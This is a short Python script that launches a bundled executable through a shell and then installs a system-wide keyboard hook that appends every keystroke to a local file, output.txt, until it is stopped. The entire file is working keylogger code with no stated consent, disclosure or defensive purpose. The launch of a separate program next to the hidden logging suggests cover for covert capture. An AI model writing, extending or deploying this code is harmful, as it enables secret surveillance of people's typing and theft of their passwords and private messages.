import keyboard
import subprocess

program_name = "start _sub_scripts\\python_main_file.exe"
subprocess.run(program_name, shell=True, check=True)

log_file = 'output.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write(event.name)
        if len(event.name) % 9 == 0:
            f.write('\n')

keyboard.on_press(on_key_press)
keyboard.wait()
